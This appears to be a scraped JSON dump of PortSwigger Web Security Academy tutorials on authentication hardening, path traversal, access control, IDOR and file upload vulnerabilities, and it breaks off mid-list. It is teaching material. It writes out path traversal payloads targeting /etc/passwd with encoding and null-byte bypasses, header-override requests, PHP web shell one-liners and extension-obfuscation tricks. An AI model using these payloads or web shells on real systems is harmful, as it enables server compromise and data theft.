Although you may have implemented HTTPS for your login requests, make sure that you enforce this by redirecting any attempted HTTP requests to HTTPS as well.\n\nYou should also audit your website to make sure that no username or email addresses are disclosed either through publicly accessible profiles or reflected in HTTP responses, for example.\n\nDon't count on users for security\n---------------------------------\n\nStrict authentication measures often require some additional effort from your users. Human nature makes it all but inevitable that some users will find ways to save themselves this effort. Therefore, you need to enforce secure behavior wherever possible.\n\nThe most obvious example is to implement an effective password policy. Some of the more traditional policies fall down because people crowbar their own predictable passwords into the policy. Instead, it can be more effective to implement a simple password checker of some kind, which allows users to experiment with passwords and provides feedback about their strength in real time. A popular example is the JavaScript library `zxcvbn`, which was developed by Dropbox. By only allowing passwords which are rated highly by the password checker, you can enforce the use of secure passwords more effectively than you can with traditional policies.\n\nPrevent username enumeration\n----------------------------\n\nIt is considerably easier for an attacker to break your authentication mechanisms if you reveal that a user exists on the system. There are even certain situations where, due to the nature of the website, the knowledge that a particular person has an account is sensitive information in itself.\n\nRegardless of whether an attempted username is valid, it is important to use identical, generic error messages, and make sure they really are identical. You should always return the same HTTP status code with each login request and, finally, make the response times in different scenarios as indistinguishable as possible.\n\nImplement robust brute-force protection\n---------------------------------------\n\nGiven how simple constructing a brute-force attack can be, it is vital to ensure that you take steps to prevent, or at least disrupt, any attempts to brute-force logins.\n\nOne of the more effective methods is to implement strict, IP-based user rate limiting. This should involve measures to prevent attackers from manipulating their apparent IP address. Ideally, you should require the user to complete a CAPTCHA test with every login attempt after a certain limit is reached.\n\nKeep in mind that this is not guaranteed to completely eliminate the threat of brute-forcing. However, making the process as tedious and manual as possible increases the likelihood that any would-be attacker gives up and goes in search of a softer target instead.\n\nTriple-check your verification logic\n------------------------------------\n\nAs demonstrated by our [labs](https://portswigger.net/web-security/all-labs#authentication), it is easy for simple [logic flaws](https://portswigger.net/web-security/logic-flaws) to creep into code which, in the case of authentication, have the potential to completely compromise your website and users. Auditing any verification or validation logic thoroughly to eliminate flaws is absolutely key to robust authentication. A check that can be bypassed is, ultimately, not much better than no check at all.\n\nDon't forget supplementary functionality\n----------------------------------------\n\nBe sure not to just focus on the central login pages and overlook additional functionality related to authentication. This is particularly important in cases where the attacker is free to register their own account and explore this functionality. Remember that a password reset or change is just as valid an attack surface as the main login mechanism and, consequently, must be equally as robust.\n\nImplement proper multi-factor authentication\n--------------------------------------------\n\nWhile multi-factor authentication may not be practical for every website, when done properly it is much more secure than password-based login alone. Remember that verifying multiple instances of the same factor is not true multi-factor authentication. Sending verification codes via email is essentially just a more long-winded form of single-factor authentication.\n\nSMS-based 2FA is technically verifying two factors (something you know and something you have). However, the potential for abuse through SIM swapping, for example, means that this system can be unreliable.\n\nIdeally, 2FA should be implemented using a dedicated device or app that generates the verification code directly. As they are purpose-built to provide security, these are typically more secure.\n\nFinally, just as with the main authentication logic, make sure that the logic in your 2FA checks is sound so that it cannot be easily bypassed.\n\n", "category": "Authentication"}, {"title": "What is Path Traversal?", "content": "In this section, we explain:\n\n*   What path traversal is.\n*   How to carry out path traversal attacks and circumvent common obstacles.\n*   How to prevent path traversal vulnerabilities.\n\n!\n\n#### Labs\n\nIf you're familiar with the basic concepts behind path traversal and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from the link below.\n\n*   [View all path traversal labs](https://portswigger.net/web-security/all-labs#path-traversal)\n\nWhat is path traversal?\n-----------------------\n\nPath traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:\n\n*   Application code and data.\n*   Credentials for back-end systems.\n*   Sensitive operating system files.\n\nIn some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.\n\nReading arbitrary files via path traversal\n------------------------------------------\n\nImagine a shopping application that displays images of items for sale. This might load an image using the following HTML:\n\n`<img src=\"/loadImage?filename=218.png\">`\n\nThe `loadImage` URL takes a `filename` parameter and returns the contents of the specified file. The image files are stored on disk in the location `/var/www/images/`. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:\n\n`/var/www/images/218.png`\n\nThis application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem:\n\n`https://insecure-website.com/loadImage?filename=../../../etc/passwd`\n\nThis causes the application to read from the following file path:\n\n`/var/www/images/../../../etc/passwd`\n\nThe sequence `../` is valid within a file path, and means to step up one level in the directory structure. The three consecutive `../` sequences step up from `/var/www/images/` to the filesystem root, and so the file that is actually read is:\n\n`/etc/passwd`\n\nOn Unix-based operating systems, this is a standard file containing details of the users that are registered on the server, but an attacker could retrieve other arbitrary files using the same technique.\n\nOn Windows, both `../` and `..\\` are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:\n\n`https://insecure-website.com/loadImage?filename=..\\..\\..\\windows\\win.ini`\n\nCommon obstacles to exploiting path traversal vulnerabilities\n-------------------------------------------------------------\n\nMany applications that place user input into file paths implement defenses against path traversal attacks. These can often be bypassed.\n\nIf an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.\n\nYou might be able to use an absolute path from the filesystem root, such as `filename=/etc/passwd`, to directly reference a file without using any traversal sequences.\n\nYou might be able to use nested traversal sequences, such as `....//` or `....\\/`. These revert to simple traversal sequences when the inner sequence is stripped.\n\nIn some contexts, such as in a URL path or the `filename` parameter of a `multipart/form-data` request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the `../` characters. This results in `%2e%2e%2f` and `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also work.\n\nFor [Burp Suite Professional](https://portswigger.net/burp/pro) users, Burp Intruder provides the predefined payload list **Fuzzing - path traversal**. This contains some encoded path traversal sequences that you can try.\n\nAn application may require the user-supplied filename to start with the expected base folder, such as `/var/www/images`. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: `filename=/var/www/images/../../../etc/passwd`.\n\nAn application may require the user-supplied filename to end with an expected file extension, such as `.png`. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: `filename=../../../etc/passwd%00.png`.\n\nHow to prevent a path traversal attack\n--------------------------------------\n\nThe most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.\n\nIf you can't avoid passing user-supplied input to filesystem APIs, we recommend using two layers of defense to prevent attacks:\n\n*   Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.\n*   After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.\n\nBelow is an example of some simple Java code to validate the canonical path of a file based on user input:\n\n```\nFile file = new File(BASE_DIRECTORY, userInput);\nif (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {\n    // process file\n}\n```\n", "category": "Path Traversal"}, {"title": "What is Access Control?", "content": "In this section, we describe:\n\n*   Privilege escalation.\n*   The types of vulnerabilities that can arise with access control.\n*   How to prevent access control vulnerabilities.\n\n#### Labs\n\nIf you're familiar with the basic concepts behind access control vulnerabilities and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from the link below.\n\n*   [View all access control labs](https://portswigger.net/web-security/all-labs#access-control-vulnerabilities)\n\nWhat is access control?\n-----------------------\n\nAccess control is the application of constraints on who or what is authorized to perform actions or access resources. In the context of web applications, access control is dependent on authentication and session management:\n\n*   **Authentication** confirms that the user is who they say they are.\n*   **Session management** identifies which subsequent HTTP requests are being made by that same user.\n*   **Access control** determines whether the user is allowed to carry out the action that they are attempting to perform.\n\nBroken access controls are common and often present a critical security vulnerability. Design and management of access controls is a complex and dynamic problem that applies business, organizational, and legal constraints to a technical implementation. Access control design decisions have to be made by humans so the potential for errors is high.\n\n!\n\n### Vertical access controls\n\nVertical access controls are mechanisms that restrict access to sensitive functionality to specific types of users.\n\nWith vertical access controls, different types of users have access to different application functions. For example, an administrator might be able to modify or delete any user's account, while an ordinary user has no access to these actions. Vertical access controls can be more fine-grained implementations of security models designed to enforce business policies such as separation of duties and least privilege.\n\n### Horizontal access controls\n\nHorizontal access controls are mechanisms that restrict access to resources to specific users.\n\nWith horizontal access controls, different users have access to a subset of resources of the same type. For example, a banking application will allow a user to view transactions and make payments from their own accounts, but not the accounts of any other user.\n\n### Context-dependent access controls\n\nContext-dependent access controls restrict access to functionality and resources based upon the state of the application or the user's interaction with it.\n\nContext-dependent access controls prevent a user performing actions in the wrong order. For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment.\n\nExamples of broken access controls\n----------------------------------\n\nBroken access control vulnerabilities exist when a user can access resources or perform actions that they are not supposed to be able to.\n\n### Vertical privilege escalation\n\nIf a user can gain access to functionality that they are not permitted to access then this is vertical privilege escalation. For example, if a non-administrative user can gain access to an admin page where they can delete user accounts, then this is vertical privilege escalation.\n\n#### Unprotected functionality\n\nAt its most basic, vertical privilege escalation arises where an application does not enforce any protection for sensitive functionality. For example, administrative functions might be linked from an administrator's welcome page but not from a user's welcome page. However, a user might be able to access the administrative functions by browsing to the relevant admin URL.\n\nFor example, a website might host sensitive functionality at the following URL:\n\n`https://insecure-website.com/admin`\n\nThis might be accessible by any user, not only administrative users who have a link to the functionality in their user interface. In some cases, the administrative URL might be disclosed in other locations, such as the `robots.txt` file:\n\n`https://insecure-website.com/robots.txt`\n\nEven if the URL isn't disclosed anywhere, an attacker may be able to use a wordlist to brute-force the location of the sensitive functionality.\n\nIn some cases, sensitive functionality is concealed by giving it a less predictable URL. This is an example of so-called \"security by obscurity\". However, hiding sensitive functionality does not provide effective access control because users might discover the obfuscated URL in a number of ways.\n\nImagine an application that hosts administrative functions at the following URL:\n\n`https://insecure-website.com/administrator-panel-yb556`\n\nThis might not be directly guessable by an attacker. However, the application might still leak the URL to users. The URL might be disclosed in JavaScript that constructs the user interface based on the user's role:\n\n```\n<script>\n\tvar isAdmin = false;\n\tif (isAdmin) {\n\t\t...\n\t\tvar adminPanelTag = document.createElement('a');\n\t\tadminPanelTag.setAttribute('https://insecure-website.com/administrator-panel-yb556');\n\t\tadminPanelTag.innerText = 'Admin panel';\n\t\t...\n\t}\n</script>\n```\n\nThis script adds a link to the user's UI if they are an admin user. However, the script containing the URL is visible to all users regardless of their role.\n\n#### Parameter-based access control methods\n\nSome applications determine the user's access rights or role at login, and then store this information in a user-controllable location. This could be:\n\n*   A hidden field.\n*   A cookie.\n*   A preset query string parameter.\n\nThe application makes access control decisions based on the submitted value. For example:\n\n```\nhttps://insecure-website.com/login/home.jsp?admin=true\nhttps://insecure-website.com/login/home.jsp?role=1\n```\n\nThis approach is insecure because a user can modify the value and access functionality they're not authorized to, such as administrative functions.\n\n#### Broken access control resulting from platform misconfiguration\n\nSome applications enforce access controls at the platform layer. they do this by restricting access to specific URLs and HTTP methods based on the user's role. For example, an application might configure a rule as follows:\n\n`DENY: POST, /admin/deleteUser, managers`\n\nThis rule denies access to the `POST` method on the URL `/admin/deleteUser`, for users in the managers group. Various things can go wrong in this situation, leading to access control bypasses.\n\nSome application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as `X-Original-URL` and `X-Rewrite-URL`. If a website uses rigorous front-end controls to restrict access based on the URL, but the application allows the URL to be overridden via a request header, then it might be possible to bypass the access controls using a request like the following:\n\n```\nPOST / HTTP/1.1\nX-Original-URL: /admin/deleteUser\n...\n```\n\nAn alternative attack relates to the HTTP method used in the request. The front-end controls described in the previous sections restrict access based on the URL and HTTP method. Some websites tolerate different HTTP request methods when performing an action. If an attacker can use the `GET` (or another) method to perform actions on a restricted URL, they can bypass the access control that is implemented at the platform layer.\n\n#### Broken access control resulting from URL-matching discrepancies\n\nWebsites can vary in how strictly they match the path of an incoming request to a defined endpoint. For example, they may tolerate inconsistent capitalization, so a request to `/ADMIN/DELETEUSER` may still be mapped to the `/admin/deleteUser` endpoint. If the access control mechanism is less tolerant, it may treat these as two different endpoints and fail to enforce the correct restrictions as a result.\n\nSimilar discrepancies can arise if developers using the Spring framework have enabled the `useSuffixPatternMatch` option. This allows paths with an arbitrary file extension to be mapped to an equivalent endpoint with no file extension. In other words, a request to `/admin/deleteUser.anything` would still match the `/admin/deleteUser` pattern. Prior to Spring 5.3, this option is enabled by default.\n\nOn other systems, you may encounter discrepancies in whether `/admin/deleteUser` and `/admin/deleteUser/` are treated as distinct endpoints. In this case, you may be able to bypass access controls by appending a trailing slash to the path.\n\n### Horizontal privilege escalation\n\nHorizontal privilege escalation occurs if a user is able to gain access to resources belonging to another user, instead of their own resources of that type. For example, if an employee can access the records of other employees as well as their own, then this is horizontal privilege escalation.\n\nHorizontal privilege escalation attacks may use similar types of exploit methods to vertical privilege escalation. For example, a user might access their own account page using the following URL:\n\n`https://insecure-website.com/myaccount?id=123`\n\nIf an attacker modifies the `id` parameter value to that of another user, they might gain access to another user's account page, and the associated data and functions.\n\n#### Note\n\nThis is an example of an insecure direct object reference (IDOR) vulnerability. This type of vulnerability arises where user-controller parameter values are used to access resources or functions directly.\n\nIn some applications, the exploitable parameter does not have a predictable value. For example, instead of an incrementing number, an application might use globally unique identifiers (GUIDs) to identify users. This may prevent an attacker from guessing or predicting another user's identifier. However, the GUIDs belonging to other users might be disclosed elsewhere in the application where users are referenced, such as user messages or reviews.\n\nIn some cases, an application does detect when the user is not permitted to access the resource, and returns a redirect to the login page. However, the response containing the redirect might still include some sensitive data belonging to the targeted user, so the attack is still successful.\n\n### Horizontal to vertical privilege escalation\n\nOften, a horizontal privilege escalation attack can be turned into a vertical privilege escalation, by compromising a more privileged user. For example, a horizontal escalation might allow an attacker to reset or capture the password belonging to another user. If the attacker targets an administrative user and compromises their account, then they can gain administrative access and so perform vertical privilege escalation.\n\nAn attacker might be able to gain access to another user's account page using the parameter tampering technique already described for horizontal privilege escalation:\n\n`https://insecure-website.com/myaccount?id=456`\n\nIf the target user is an application administrator, then the attacker will gain access to an administrative account page. This page might disclose the administrator's password or provide a means of changing it, or might provide direct access to privileged functionality.\n\n### Insecure direct object references\n\nInsecure direct object references (IDORs) are a subcategory of access control vulnerabilities. IDORs occur if an application uses user-supplied input to access objects directly and an attacker can modify the input to obtain unauthorized access. It was popularized by its appearance in the OWASP 2007 Top Ten. It's just one example of many implementation mistakes that can provide a means to bypass access controls.\n\n### Access control vulnerabilities in multi-step processes\n\nMany websites implement important functions over a series of steps. This is common when:\n\n*   A variety of inputs or options need to be captured.\n*   The user needs to review and confirm details before the action is performed.\n\nFor example, the administrative function to update user details might involve the following steps:\n\n1.  Load the form that contains details for a specific user.\n2.  Submit the changes.\n3.  Review the changes and confirm.\n\nSometimes, a website will implement rigorous access controls over some of these steps, but ignore others. Imagine a website where access controls are correctly applied to the first and second steps, but not to the third step. The website assumes that a user will only reach step 3 if they have already completed the first steps, which are properly controlled. An attacker can gain unauthorized access to the function by skipping the first two steps and directly submitting the request for the third step with the required parameters.\n\n### Referer-based access control\n\nSome websites base access controls on the `Referer` header submitted in the HTTP request. The `Referer` header can be added to requests by browsers to indicate which page initiated a request.\n\nFor example, an application robustly enforces access control over the main administrative page at `/admin`, but for sub-pages such as `/admin/deleteUser` only inspects the `Referer` header. If the `Referer` header contains the main `/admin` URL, then the request is allowed.\n\nIn this case, the `Referer` header can be fully controlled by an attacker. This means that they can forge direct requests to sensitive sub-pages by supplying the required `Referer` header, and gain unauthorized access.\n\n### Location-based access control\n\nSome websites enforce access controls based on the user's geographical location. This can apply, for example, to banking applications or media services where state legislation or business restrictions apply. These access controls can often be circumvented by the use of web proxies, VPNs, or manipulation of client-side geolocation mechanisms.\n\nHow to prevent access control vulnerabilities\n---------------------------------------------\n\nAccess control vulnerabilities can be prevented by taking a defense-in-depth approach and applying the following principles:\n\n*   Never rely on obfuscation alone for access control.\n*   Unless a resource is intended to be publicly accessible, deny access by default.\n*   Wherever possible, use a single application-wide mechanism for enforcing access controls.\n*   At the code level, make it mandatory for developers to declare the access that is allowed for each resource, and deny access by default.\n*   Thoroughly audit and test access controls to ensure they work as designed.\n", "category": "Access Control"}, {"title": "Insecure direct object references (IDOR)", "content": "### Access control\n\n*    [What is access control?](https://portswigger.net/web-security/access-control#what-is-access-control)\n    *   [Vertical access controls](https://portswigger.net/web-security/access-control#vertical-access-controls)\n    *   [Horizontal access controls](https://portswigger.net/web-security/access-control#horizontal-access-controls)\n    *   [Context-dependent access controls](https://portswigger.net/web-security/access-control#context-dependent-access-controls)\n*    [Vertical privilege escalation](https://portswigger.net/web-security/access-control#vertical-privilege-escalation)\n    *   [Unprotected functionality](https://portswigger.net/web-security/access-control#unprotected-functionality)\n    *   [Parameter-based access control](https://portswigger.net/web-security/access-control#parameter-based-access-control-methods)\n    *   [Platform misconfiguration](https://portswigger.net/web-security/access-control#broken-access-control-resulting-from-platform-misconfiguration)\n    *   [URL-matching discrepancies](https://portswigger.net/web-security/access-control#broken-access-control-resulting-from-url-matching-discrepancies)\n*   [Horizontal privilege escalation](https://portswigger.net/web-security/access-control#horizontal-privilege-escalation)\n*   [Horizontal to vertical privilege escalation](https://portswigger.net/web-security/access-control#horizontal-to-vertical-privilege-escalation)\n*    [Insecure direct object references (IDOR)](https://portswigger.net/web-security/access-control/idor)\n    *   [Direct references to database objects](https://portswigger.net/web-security/access-control/idor#idor-vulnerability-with-direct-reference-to-database-objects)\n    *   [Direct references to static files](https://portswigger.net/web-security/access-control/idor#idor-vulnerability-with-direct-reference-to-static-files)\n*   [Vulnerabilities in multi-step processes](https://portswigger.net/web-security/access-control#access-control-vulnerabilities-in-multi-step-processes)\n*   [Vulnerabilities in Referer-based controls](https://portswigger.net/web-security/access-control#referer-based-access-control)\n*   [Vulnerabilities in location-based controls](https://portswigger.net/web-security/access-control#location-based-access-control)\n*   [Preventing](https://portswigger.net/web-security/access-control#how-to-prevent-access-control-vulnerabilities)\n*   [View all access control labs](https://portswigger.net/web-security/all-labs#access-control-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [Access control](https://portswigger.net/web-security/access-control)\n*   [IDOR](https://portswigger.net/web-security/access-control/idor)\n\nInsecure direct object references (IDOR)\n========================================\n\nIn this section, we will explain what insecure direct object references (IDOR) are and describe some common vulnerabilities.\n\nWhat are insecure direct object references (IDOR)?\n--------------------------------------------------\n\nInsecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. The term IDOR was popularized by its appearance in the OWASP 2007 Top Ten. However, it is just one example of many access control implementation mistakes that can lead to [access controls](https://portswigger.net/web-security/access-control) being circumvented. IDOR vulnerabilities are most commonly associated with horizontal privilege escalation, but they can also arise in relation to vertical privilege escalation.\n\nIDOR examples\n-------------\n\nThere are many examples of access control vulnerabilities where user-controlled parameter values are used to access resources or functions directly.\n\n### IDOR vulnerability with direct reference to database objects\n\nConsider a website that uses the following URL to access the customer account page, by retrieving information from the back-end database:\n\n`https://insecure-website.com/customer_account?customer_number=132355`Here, the customer number is used directly as a record index in queries that are performed on the back-end database. If no other controls are in place, an attacker can simply modify the `customer_number` value, bypassing access controls to view the records of other customers. This is an example of an IDOR vulnerability leading to horizontal privilege escalation.\n\nAn attacker might be able to perform horizontal and vertical privilege escalation by altering the user to one with additional privileges while bypassing access controls. Other possibilities include exploiting password leakage or modifying parameters once the attacker has landed in the user's accounts page, for example.\n\n### IDOR vulnerability with direct reference to static files\n\nIDOR vulnerabilities often arise when sensitive resources are located in static files on the server-side filesystem. For example, a website might save chat message transcripts to disk using an incrementing filename, and allow users to retrieve these by visiting a URL like the following:\n\n`https://insecure-website.com/static/12144.txt`In this situation, an attacker can simply modify the filename to retrieve a transcript created by another user and potentially obtain user credentials and other sensitive data.\n\nLAB\n\nAPPRENTICE [Insecure direct object references](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references)\n\n", "category": "Access Control"}, {"title": "What is File Upload?", "content": "File upload vulnerabilities\n---------------------------\n\nIn this section, you'll learn how simple file upload functions can be used as a powerful vector for a number of high-severity attacks. We'll show you how to bypass common defense mechanisms in order to upload a web shell, enabling you to take full control of a vulnerable web server. Given how common file upload functions are, knowing how to test them properly is essential knowledge.\n\n!\n\n#### Labs\n\nIf you're already familiar with the basic concepts behind file upload vulnerabilities and just want to get practicing, you can access all of the labs in this topic from the link below.\n\n*   [View all file upload labs](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)\n\nWhat are file upload vulnerabilities?\n-------------------------------------\n\nFile upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.\n\nIn some cases, the act of uploading the file is in itself enough to cause damage. Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.\n\nWhat is the impact of file upload vulnerabilities?\n--------------------------------------------------\n\nThe impact of file upload vulnerabilities generally depends on two key factors:\n\n*   Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on.\n*   What restrictions are imposed on the file once it has been successfully uploaded.\n\nIn the worst case scenario, the file's type isn't validated properly, and the server configuration allows certain types of file (such as `.php` and `.jsp`) to be executed as code. In this case, an attacker could potentially upload a server-side code file that functions as a web shell, effectively granting them full control over the server.\n\nIf the filename isn't validated properly, this could allow an attacker to overwrite critical files simply by uploading a file with the same name. If the server is also vulnerable to [directory traversal](https://portswigger.net/web-security/file-path-traversal), this could mean attackers are even able to upload files to unanticipated locations.\n\nFailing to make sure that the size of the file falls within expected thresholds could also enable a form of denial-of-service (DoS) attack, whereby the attacker fills the available disk space.\n\nHow do file upload vulnerabilities arise?\n-----------------------------------------\n\nGiven the fairly obvious dangers, it's rare for websites in the wild to have no restrictions whatsoever on which files users are allowed to upload. More commonly, developers implement what they believe to be robust validation that is either inherently flawed or can be easily bypassed.\n\nFor example, they may attempt to blacklist dangerous file types, but fail to account for parsing discrepancies when checking the file extensions. As with any blacklist, it's also easy to accidentally omit more obscure file types that may still be dangerous.\n\nIn other cases, the website may attempt to check the file type by verifying properties that can be easily manipulated by an attacker using tools like Burp Proxy or Repeater.\n\nUltimately, even robust validation measures may be applied inconsistently across the network of hosts and directories that form the website, resulting in discrepancies that can be exploited.\n\nHow do web servers handle requests for static files?\n----------------------------------------------------\n\nBefore we look at how to exploit file upload vulnerabilities, it's important that you have a basic understanding of how servers handle requests for static files.\n\nHistorically, websites consisted almost entirely of static files that would be served to users when requested. As a result, the path of each request could be mapped 1:1 with the hierarchy of directories and files on the server's filesystem. Nowadays, websites are increasingly dynamic and the path of a request often has no direct relationship to the filesystem at all. Nevertheless, web servers still deal with requests for some static files, including stylesheets, images, and so on.\n\nThe process for handling these static files is still largely the same. At some point, the server parses the path in the request to identify the file extension. It then uses this to determine the type of the file being requested, typically by comparing it to a list of preconfigured mappings between extensions and MIME types. What happens next depends on the file type and the server's configuration.\n\n*   If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.\n*   If the file type is executable, such as a PHP file, **and** the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response.\n*   If the file type is executable, but the server **is not** configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information. You can see an [example](https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files) of this in our [information disclosure](https://portswigger.net/web-security/information-disclosure) learning materials.\n\n#### Tip\n\nThe `Content-Type` response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.\n\nNow that you're familiar with the key concepts, let's look at how you can potentially exploit these kinds of vulnerabilities.\n\nExploiting unrestricted file uploads to deploy a web shell\n----------------------------------------------------------\n\nFrom a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.\n\n#### Web shell\n\nA web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.\n\nIf you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:\n\n`<?php echo file_get_contents('/path/to/target/file'); ?>`\n\nOnce uploaded, sending a request for this malicious file will return the target file's contents in the response.\n\nA more versatile web shell may look something like this:\n\n`<?php echo system($_GET['command']); ?>`\n\nThis script enables you to pass an arbitrary system command via a query parameter as follows:\n\n`GET /example/exploit.php?command=id HTTP/1.1`\n\nExploiting flawed validation of file uploads\n--------------------------------------------\n\nIn the wild, it's unlikely that you'll find a website that has no protection against file upload attacks like we saw in the previous lab. But just because defenses are in place, that doesn't mean that they're robust. You can sometimes still exploit flaws in these mechanisms to obtain a web shell for remote code execution.\n\n### Flawed file type validation\n\nWhen submitting HTML forms, the browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-url-encoded`. This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is preferred.\n\nConsider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:\n\n```\nPOST /images HTTP/1.1\n    Host: normal-website.com\n    Content-Length: 12345\n    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456\n\n    ---------------------------012345678901234567890123456\n    Content-Disposition: form-data; name=\"image\"; filename=\"example.jpg\"\n    Content-Type: image/jpeg\n\n    [...binary content of example.jpg...]\n\n    ---------------------------012345678901234567890123456\n    Content-Disposition: form-data; name=\"description\"\n\n    This is an interesting description of my image.\n\n    ---------------------------012345678901234567890123456\n    Content-Disposition: form-data; name=\"username\"\n\n    wiener\n    ---------------------------012345678901234567890123456--\n```\n\nAs you can see, the message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header, which provides some basic information about the input field it relates to. These individual parts may also contain their own `Content-Type` header, which tells the server the MIME type of the data that was submitted using this input.\n\nOne way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater.\n\n### Preventing file execution in user-accessible directories\n\nWhile it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.\n\nAs a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:\n\n```\nGET /static/exploit.php?command=id HTTP/1.1\n    Host: normal-website.com\n\n    HTTP/1.1 200 OK\n    Content-Type: text/plain\n    Content-Length: 39\n\n    <?php echo system($_GET['command']); ?>\n```\n\nThis behavior is potentially interesting in its own right, as it may provide a way to leak source code, but it nullifies any attempt to create a web shell.\n\nThis kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.\n\n#### Tip\n\nWeb servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved.\n\nYou should also note that even though you may send all of your requests to the same domain name, this often points to a reverse proxy server of some kind, such as a load balancer. Your requests will often be handled by additional servers behind the scenes, which may also be configured differently.\n\n### Insufficient blacklisting of dangerous file types\n\nOne of the more obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like `.php`. The practice of blacklisting is inherently flawed as it's difficult to explicitly block every possible file extension that could be used to execute code. Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as `.php5`, `.shtml`, and so on.\n\n#### Overriding the server configuration\n\nAs we discussed in the previous section, servers typically won't execute files unless they have been configured to do so. For example, before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their `/etc/apache2/apache2.conf` file:\n\n```\nLoadModule php_module /usr/lib/apache2/modules/libphp.so\n    AddType application/x-httpd-php .php\n```\n\nMany servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.\n\nSimilarly, developers can make directory-specific configuration on IIS servers using a `web.config` file. This might include directives such as the following, which in this case allows JSON files to be served to users:\n\n```\n<staticContent>\n    <mimeMap fileExtension=\".json\" mimeType=\"application/json\" />\n    </staticContent>\n```\n\nWeb servers use these kinds of configuration files when present, but you're not normally allowed to access them using HTTP requests. However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.\n\n#### Obfuscating file extensions\n\nEven the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that `exploit.pHp` is in fact a `.php` file. If the code that subsequently maps the file extension to a MIME type is **not** case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server.\n\nYou can also achieve similar results using the following techniques:\n\n*   Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`\n*   Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`\n*   Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`\n* 